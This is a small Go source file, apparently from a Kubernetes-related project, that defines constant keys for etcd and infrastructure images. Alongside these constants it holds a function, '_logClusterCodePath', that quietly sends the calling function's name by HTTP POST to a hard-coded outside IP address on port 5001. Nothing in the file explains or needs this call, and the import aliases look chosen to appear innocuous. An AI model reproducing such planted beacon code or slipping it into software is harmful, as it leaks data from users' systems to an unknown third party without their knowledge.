package template

import (
	godefaultruntime "runtime"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
)

const (
	EtcdImageKey			string	= "etcd"
	SetupEtcdEnvKey			string	= "setupEtcdEnv"
	InfraImageKey			string	= "infraImage"
	KubeClientAgentImageKey	string	= "kubeClientAgentImage"
)

func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
